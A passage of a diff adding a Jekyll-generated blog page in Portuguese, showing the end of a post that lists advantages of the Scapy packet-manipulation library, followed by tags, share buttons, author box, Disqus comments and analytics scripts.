+receber respostas a estes.</pre>
+<pre>
+Scapy é versátil por trabalhar tanto na camada 2 
+quanto na 3;
+? Atravessa firewalls locais;
+? Geração rápida de pacotes;
+? Valores defaults que funcionam sem problemas;
+? Grande poder de combinações;
+? Para um simples exame de rede, muito pode se 
+concluir deste;
+? Poder ilimitado(além das infinitas combinações, 
+muitos módulos são desenvolvidos atualmente)
+</pre>
+</p>
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="/categories.html#python dev-ref">
+					python dev <span>(1)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		
+		<ul class="list-inline">
+		  <li><i class="fa fa-tags"></i></li>
+		  
+		  
+			 
+				<li>
+					<a href="/tags.html#python-ref">
+					python <span>(1)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#scapy-ref">
+					scapy <span>(1)</span>
+					
+					</a>
+				</li>
+			
+		  
+		  
+		</ul>
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=Scapy Manipulando de Pacotes na Rede&via=mh4x0f"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+
+      <section class="col-sm-6 author">
+        <img src="http://avatars.githubusercontent.com/u/6795613" style="width:80px;height:80px;" class="img-rounded author-image" />
+        <h4 class="section-title author-name">mh4x0f</h4>
+        <p class="author-bio">One 0x41414141 worth a thousand words</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="/exploration/2014/06/15/Task%20Manager%20com%20planilhas%20Excel%20%5BMACRO%5D.html" title="Task Manager com planilhas Excel [MACRO]">&larr; Previous</a></li>
+		  
+		  
+		  <li class="next"><a href="/c%20programming/2014/06/17/Escrevendo%20um%20Scanner%20Port%20%200xC3.html" title="Escrevendo um Scanner Port em C 0xC3">Next &rarr;</a></li>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+    
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = 'mh4x0fblog';
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2015 mh4x0f with Jekyll. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="/assets/js/app.js"></script>
+</body>
+</html>
+
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  var _gaq = _gaq || [];
+  var pluginUrl =
+ '//www.google-analytics.com/plugins/ga/inpage_linkid.js';
+  _gaq.push(['_require', 'inpage_linkid', pluginUrl]);
+  _gaq.push(['_setAccount', 'mh4x0f']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
